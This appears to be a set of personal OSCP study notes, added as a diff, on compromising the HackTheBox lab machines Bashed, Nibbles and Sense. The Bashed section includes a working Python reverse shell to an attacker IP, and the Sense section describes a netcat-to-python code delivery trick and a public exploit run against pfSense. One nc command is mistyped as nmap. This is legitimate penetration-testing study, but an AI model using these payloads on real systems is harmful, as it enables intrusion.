@@ -1,0 +1,106 @@
+# OSCP Preparation Boxes
+
+``` 
+FORMAT
+
+### Approach Taken
+
+### Lessons Learned
+
+### Commands Used
+
+```
+
+## 1. Bashed
+
+### Approach Taken
+- nmap scan is run with default scripts along with version enumeration.
+- Once you discover the web application on the specified port you will try to find out which version of operating system that is.
+- Then running gobuster will reveal specific uris like /php & /dev which will expose sendmail & webshells
+- Once getting the web shell we upload the LinEnum.sh to discover that the user can run anything as `scriptmanager` user.
+- the scriptmanager user has a script which is executed by the root as a cron, we will try to leverage that cronjob by place our pentest monkey scripts to get a root shell
+
+### Lessons Learned
+- This is the very first box that we did on HTB. Ippsec showed how you need to document your findings as you try to solve the box
+- Enumeration is a very important step.
+- The way we should use cherrytree to document findings is the important lesson learned here 
+
+### Commands Used
+```
+nmap -sC -sV -oA nmap_bashed 10.10.10.68
+
+gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+## 2. Nibbles
+
+### Approach Taken
+- nmap scan is run with default scripts along with version enumeration
+- gobuster is run but nothing is revealed
+- Hence we try to intercept the request with burp, & when we look at the server response we get pointed out to a specific uri path which is /nibbleblog
+- When we explore that we get the software used which is nibbleblog
+- we will download a version of nibbleblog from the internet, and we will explode in a local directory
+- we will try to query the version within this exploded path & find the file which exposes that version
+- we will then try to navigate the same uri path on the web application
+- with this the version information is also exposed.
+- the next step is to find out what vulnerabilities can be found with the app & its version being known
+- we simply use searchsploit & find out the vulns
+- we can simply execute the script or do the same with metasploit, this is the easy way of getting a shell on the box
+- once you will get a shell you will list the sudo privs and find out that a specific script can be executed as root, you will modify this script to get a root escalation and a root shell
+
+### Lessons Learned
+- If gobuster goes south, you will need to find out what is the web application software running
+- Once the software running is known, we will try to find out which version of web app is running
+- You can download a copy from internet & find files where the version information is exposed, we can try to use that info/file detail with the app/box that we want to compromise
+- once the version & app info is known, use searchsploit or cve details to find out exploits or vulnerabilities.
+- the go for further enumeration to privilege escalate yourselves
+
+### Commands Used
+```
+nmap -sC -sV -oA nmap_nibbles 10.10.10.75
+
+gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+searchsploit nibbleblog 4.0.3
+
+searchsploit -m php/remote/38489.rb
+```
+
+## 3. Sense
+
+### Approach Taken
+- After running nmap & gobuster you will find users who can use weak credentials
+- Once you login you will find the app being used & its version
+- You will find the CVE details & vulns (command injection here is the key vuln)
+- You will leverage command injection with the help of burp repeater & will try to get a shell on the system
+- Once the shell is obtained, you are already root so nothing further to be done
+
+### Lessons Learned
+- Running burp is heavily acquianted here especially using repeater
+- Use gobuster to expose different types of file extensions and they can be a critical vector to spot authentication related information
+- What if your are banned or locked out, you can use different techniques like `ssh -D` or proxy chains or burp proxying this is a very useful technique
+- played with nc in different ways where you can submit a bunch of code by using `nmap -lnvp <lport> < pentest_pyth_script.txt` & when you do `nc <attack-host> <lport> | python` you will get passed the pentest_pyth_script.txt and you can get a reverse shell by setting up another listener on attack box, this technique is amazing whenever passing the code around with command injection becomes difficult.
+
+### Commands Used
+```
+nmap -sC -sV -oA nmap_sense 10.10.10.60
+
+gobuster dir -t 64 -k -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
+
+searchsploit pfsense 2.1.3
+
+searchsploit -m php/webapps/43560.py
+
+./43560.py --rhost 10.10.10.60 --lhost 10.10.14.25 --lport 4444 --username rohit --password pfsense
+
+``` 
+
+## 4. Node
+
+### Approach Taken
+
+### Lessons Learned
+
+### Commands Used
